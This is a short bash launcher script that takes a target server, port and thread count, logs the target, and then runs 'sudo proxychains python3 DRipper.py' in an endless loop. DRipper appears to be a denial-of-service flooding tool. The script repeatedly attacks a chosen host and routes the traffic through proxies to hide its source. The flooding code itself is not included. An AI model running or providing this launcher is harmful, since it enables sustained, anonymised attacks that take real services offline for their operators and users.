#!/bin/bash

YELLOW='\033[0;33m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m' # No Color

while getopts s:p:t: flag
do
    case "${flag}" in
        s) server=${OPTARG};;
        p) port=${OPTARG};;
        t) turbo=${OPTARG};;
    esac
done


# Set default values
if [ -z $port ]; then
    port=80
fi

if [ -z $server ]; then
    echo "Server -s is empty"
    exit 0
fi

if [ -z $turbo ]; then
    turbo=300
fi


echo -e "${YELLOW}Start loop connect ${CYAN}$server:$port${YELLOW}" 
echo -e "${RED}turbo:$turbo${NC}"

# log last target
lasttargetfile=lasttartget.log
touch $lasttargetfile
echo "$(date) $server : $port" > $lasttargetfile

#go back
#cd ../../

# run
while :
do
  sudo proxychains python3 DRipper.py -t $turbo -p $port -s $server
done









